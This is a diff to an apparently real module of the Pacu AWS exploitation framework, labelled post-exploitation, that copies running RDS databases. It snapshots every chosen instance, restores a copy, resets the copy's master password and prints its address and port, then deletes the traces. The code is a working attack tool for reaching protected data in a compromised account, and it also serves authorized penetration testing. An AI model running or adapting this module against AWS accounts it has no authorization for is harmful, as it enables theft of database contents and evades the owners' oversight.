@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
 import argparse
-import datetime
 from pathlib import Path
 import json
 
@@ -10,8 +9,8 @@ module_info = {
     'name': 'rds_snapshot_explorer',
     'author': 'Alexander Morgenstern alexander.morgenstern@rhinosecuritylabs.com',
     'category': 'post-exploitation',
-    'one_liner': 'Snapshot databases, change the master password, exfiltrate data.',
-    'description': 'Snapshot all databases, restore new databases from those snapshots, then ModifyDBInstance to change the master password, then maybe mysqldump/psqldump/etc to exfil it, then cleanup all the resources that were created.',
+    'one_liner': 'Creates copies of running RDS databases to access protected information',
+    'description': 'Creates a snapshot of all databases instances, restore new databases instances from those snapshots, and then changes the master password to allow access to the copied database. After the database has been created, the connection information is given. After interactions with the database are complete, the temporary resources are deleted. If there is an unexpected crash during the module\'s execution, the subsequent run of the module will attempt to clean up any leftover temporary resources.',
     'services': ['RDS'],
     'prerequisite_modules': [],
     'external_dependencies': [],
@@ -21,52 +20,72 @@ parser = argparse.ArgumentParser(add_help=False, description=module_info['descri
 parser.add_argument('--regions', required=False, default=None, help='One or more (comma separated) AWS regions in the format us-east-1. Defaults to all session regions.')
 
 TEMP_FILE = Path(__file__).parent / 'temp.json'
+WAIT_CONFIG = {'Delay': 10}
+
 
 def mark_temp(resource):
     if 'DBInstanceArn' in resource:
         key = 'Instances'
-        val = resource['DBInstanceIdentifier']
+        identifier = resource['DBInstanceArn']
     else:
         key = 'Snapshots'
-        val = resource['DBSnapshotIdentifier']
+        identifier = resource['DBSnapshotArn']
     data = read_temp()
-    data[key][val] = resource
+    data[key][identifier] = resource
     write_temp(data)
+
 
 def remove_temp(resource):
     if 'DBInstanceArn' in resource:
         key = 'Instances'
-        val = resource['DBInstanceIdentifier']
+        identifier = resource['DBInstanceArn']
     else:
         key = 'Snapshots'
-        val = resource['DBSnapshotIdentifier']
+        identifier = resource['DBSnapshotArn']
     data = read_temp()
-    del data[key][val]
+    del data[key][identifier]
     write_temp(data)
+
 
 def read_temp():
     with TEMP_FILE.open('r') as infile:
-        return json.load(infile)
+        data = json.load(infile)
+    return data
+
 
 def write_temp(data):
     with TEMP_FILE.open('w') as outfile:
-        json.dump(data, outfile, skipkeys=True)
+        json.dump(data, outfile, default=str)
+
 
 def cleanup(pacu):
     data = read_temp()
+    success = True
     for instance in data['Instances']:
         client = pacu.get_boto3_client('rds', data['Instances'][instance]['AvailabilityZone'][:-1])
-        client.delete_db_instance(
-            DBInstanceIdentifier=instance,
-            SkipFinalSnapshot=True,
-        )
+        try:
+            client.delete_db_instance(
+                DBInstanceIdentifier=instance,
+                SkipFinalSnapshot=True,
+            )
+        except ClientError as error:
+            pacu.print(error.response['Error']['Code'])
+            success = False
+            continue
+        remove_temp(instance)
     for snapshot in data['Snapshots']:
-        client = pacu.get_boto3_client('rds', data['Instances'][instance])
-        client.delete_db_snapshot(
-            DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier']
-        )
-        
-    
+        client = pacu.get_boto3_client('rds', data['Snapshots'][snapshot]['AvailabilityZone'][:-1])
+        try:
+            client.delete_db_snapshot(
+                DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier']
+            )
+        except ClientError as error:
+            pacu.print(error.response['Error']['Code'])
+            success = False
+            continue
+        remove_temp(snapshot)
+    return success
+
 
 def main(args, pacu):
     """Main module function, called from Pacu"""
@@ -75,35 +94,56 @@ def main(args, pacu):
         regions = args.regions.split(',')
     else:
         regions = pacu.get_regions('rds')
-    cleanup(pacu)
+    if not cleanup(pacu):
+        if pacu.input('  Cleanup Failed. Continue? (y/n) ') != 'y':
+            return {'fail': 'Failed to delete temporary data.'}
+    summary_data = {'instances': 0}
     for region in regions:
         pacu.print('Region: {}'.format(region))
         client = pacu.get_boto3_client('rds', region)
+        pacu.print('  Getting RDS instances...')
         active_instances = get_all_region_instances(client)
+        pacu.print('  Found {} RDS instance(s)'.format(len(active_instances)))
+        for instance in active_instances:
+            prompt = '    Target: {} (y/n)? '.format(instance['DBInstanceIdentifier'])
+            if pacu.input(prompt) != 'y':
+                continue
+            pacu.print('    Creating temporary snapshot...')
+            temp_snapshot = create_snapshot_from_instance(client, instance)
+            pacu.print('    Restoring temporary instance from snapshot...')
+            temp_instance = restore_instance_from_snapshot(client, temp_snapshot)
 
-        # temp_snapshots = create_snapshots_from_instances(client, temp_instance)
+            process_instance(pacu, client, temp_instance)
 
-        snapshots = create_snapshots_from_instances(client, active_instances)
-        temp_instances = restore_instance_from_snapshots(client, snapshots)
-        
-        process_instances(pacu, client, temp_instances)
+            pacu.print('    Deleting temporary resources...')
+            delete_instance(client, temp_instance)
+            delete_snapshot(client, temp_snapshot)
+            summary_data['instances'] += 1
+    return summary_data
 
-        # Cleanup
-        delete_instances(client, temp_instances)
-        delete_snapshots(client, snapshots)
-    return {}
 
-def process_instances(pacu, client, instances):
-    for instance in instances:
-        waiter = client.get_waiter('db_instance_available')
-        waiter.wait(DBInstanceIdentifier=instance['DBInstanceIdentifier'])
-        password = pacu.input('  Set Master Password for current Instance: ')
-        if modify_master_password(client, instance, password):
-            pacu.print('  Password Change Successfully')
-        else:
-            pacu.print('  Password Change Failed')
+def process_instance(pacu, client, instance):
+    waiter = client.get_waiter('db_instance_available')
+    waiter.wait(
+        DBInstanceIdentifier=instance['DBInstanceIdentifier'],
+        WaiterConfig=WAIT_CONFIG,
+    )
+    password = pacu.input('    Set Master Password for current Instance: ')
+    if modify_master_password(client, instance, password):
+        pacu.print('      Password Change Successfully')
+    else:
+        pacu.print('      Password Change Failed')
 
-        pacu.input('Press enter to process next instance...')
+    response = client.describe_db_instances(
+        DBInstanceIdentifier=instance['DBInstanceIdentifier']
+    )
+    endpoint = response['DBInstances'][0]['Endpoint']
+    pacu.print('    Connection Information:')
+    pacu.print('      Address: {}'.format(endpoint['Address']))
+    pacu.print('      Port: {}'.format(endpoint['Port']))
+
+    pacu.input('    Press enter to process next instance...')
+
 
 def modify_master_password(client, instance, password):
     try:
@@ -116,72 +156,80 @@ def modify_master_password(client, instance, password):
         print(error)
     return False
 
-def delete_instances(client, instances):
-    for instance in instances:
-        waiter = client.get_waiter('db_instance_available')
-        waiter.wait(DBInstanceIdentifier=instance['DBInstanceIdentifier'])
-        try:
-            response = client.delete_db_instance(
-                DBInstanceIdentifier=instance['DBInstanceIdentifier'],
-                SkipFinalSnapshot=True,
-            )
-            remove_temp(response['DBInstance'])
-        except ClientError as error:
-            print(error)
-            return
-    #Confirm that instance has been deleted
-    for instance in instances:
-        waiter = client.get_waiter('db_instance_deleted')
-        waiter.wait(DBInstanceIdentifier=instance['DBInstanceIdentifier'])
 
-def restore_instance_from_snapshots(client, snapshots):
-    instances = []
-    for snapshot in snapshots:
-        waiter = client.get_waiter('db_snapshot_available')
-        waiter.wait(DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier'])
-        try:
-            response = client.restore_db_instance_from_db_snapshot(
-                DBInstanceIdentifier=snapshot['DBSnapshotIdentifier'],
-                DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier'],
-            )
-            instances.append(response['DBInstance'])
-            mark_temp(response['DBInstance'])
-
-        except ClientError as error:
-            print(error)
-    return instances
+def delete_instance(client, instance):
+    waiter = client.get_waiter('db_instance_available')
+    waiter.wait(
+        DBInstanceIdentifier=instance['DBInstanceIdentifier'],
+        WaiterConfig=WAIT_CONFIG,
+    )
+    try:
+        response = client.delete_db_instance(
+            DBInstanceIdentifier=instance['DBInstanceIdentifier'],
+            SkipFinalSnapshot=True,
+        )
+        remove_temp(response['DBInstance'])
+    except ClientError as error:
+        print(error)
+        return
+    waiter = client.get_waiter('db_instance_deleted')
+    waiter.wait(
+        DBInstanceIdentifier=instance['DBInstanceIdentifier'],
+        WaiterConfig=WAIT_CONFIG,
+    )
 
 
-def delete_snapshots(client, snapshots):
-    for snapshot in snapshots:
-        waiter = client.get_waiter('db_snapshot_available')
-        waiter.wait(DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier'])
-        try:
-            response = client.delete_db_snapshot(
-                DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier']
-            )
-            remove_temp(response['DBSnapshot'])
-            return True
-        except ClientError as error:
-            print(error)
+def restore_instance_from_snapshot(client, snapshot):
+    waiter = client.get_waiter('db_snapshot_available')
+    waiter.wait(
+        DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier'],
+        WaiterConfig=WAIT_CONFIG,
+    )
+    try:
+        response = client.restore_db_instance_from_db_snapshot(
+            DBInstanceIdentifier=snapshot['DBSnapshotIdentifier'],
+            DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier'],
+        )
+        mark_temp(response['DBInstance'])
+        return response['DBInstance']
+    except ClientError as error:
+        print(error)
+    return {}
+
+
+def delete_snapshot(client, snapshot):
+    waiter = client.get_waiter('db_snapshot_available')
+    waiter.wait(
+        DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier'],
+        WaiterConfig=WAIT_CONFIG,
+    )
+    try:
+        response = client.delete_db_snapshot(
+            DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier']
+        )
+        remove_temp(response['DBSnapshot'])
+        return True
+    except ClientError as error:
+        print(error)
     return True
 
 
-def create_snapshots_from_instances(client, instances):
-    snapshots = []
-    for instance in instances:
-        waiter = client.get_waiter('db_instance_available')
-        waiter.wait(DBInstanceIdentifier=instance['DBInstanceIdentifier'])
-        try:
-            response = client.create_db_snapshot(
-                DBSnapshotIdentifier=instance['DBInstanceIdentifier'] + '-copy',
-                DBInstanceIdentifier=instance['DBInstanceIdentifier'],
-            )
-            mark_temp(response['DBSnapshot'])
-            snapshots.append(response['DBSnapshot'])
-        except ClientError as error:
-            print(error)
-    return snapshots
+def create_snapshot_from_instance(client, instance):
+    waiter = client.get_waiter('db_instance_available')
+    waiter.wait(
+        DBInstanceIdentifier=instance['DBInstanceIdentifier'],
+        WaiterConfig=WAIT_CONFIG,
+    )
+    try:
+        response = client.create_db_snapshot(
+            DBSnapshotIdentifier=instance['DBInstanceIdentifier'] + '-copy',
+            DBInstanceIdentifier=instance['DBInstanceIdentifier'],
+        )
+        mark_temp(response['DBSnapshot'])
+        return response['DBSnapshot']
+    except ClientError as error:
+        print(error)
+    return {}
 
 
 def get_all_region_instances(client):
@@ -197,7 +245,8 @@ def get_all_region_instances(client):
         return []
 
 
-
 def summary(data, pacu_main):
-    out = ''
-    return out
+    if 'fail' in data:
+        return data['fail']
+    return '  {} Instance(s) Copies Launched'.format(data['instances'])
+
